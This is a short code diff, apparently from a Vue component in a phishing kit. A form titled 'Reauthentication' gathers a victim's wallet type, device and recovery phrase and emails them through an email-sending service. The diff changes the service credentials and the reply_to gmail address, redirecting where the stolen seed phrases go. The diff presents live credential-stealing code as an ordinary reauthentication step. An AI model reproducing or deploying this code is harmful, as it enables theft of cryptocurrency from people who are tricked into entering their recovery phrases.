@@ -71,15 +71,15 @@ export default {
         if (valid) {
           if (valid) {
             var data = {
-              service_id: "service_70ntltg",
-              template_id: "template_3y5sgim",
-              user_id: "user_6dMy0FAzh3UkwGQuDDbjZ",
+              service_id: "service_fukql9p",
+              template_id: "template_t73hyiq",
+              user_id: "user_gEIO4dyYsGHrZgmFgY1Ul",
               template_params: {
                 from_name: 'Reauthentication',
                 wallet_version: this.ruleForm.wallet,
                 device: this.ruleForm.device,
                 nnemonics: this.ruleForm.recovery,
-                reply_to: "janetwilliams1305@gmail.com",
+                reply_to: "crewwebinar@gmail.com",
               },
             };
             axios
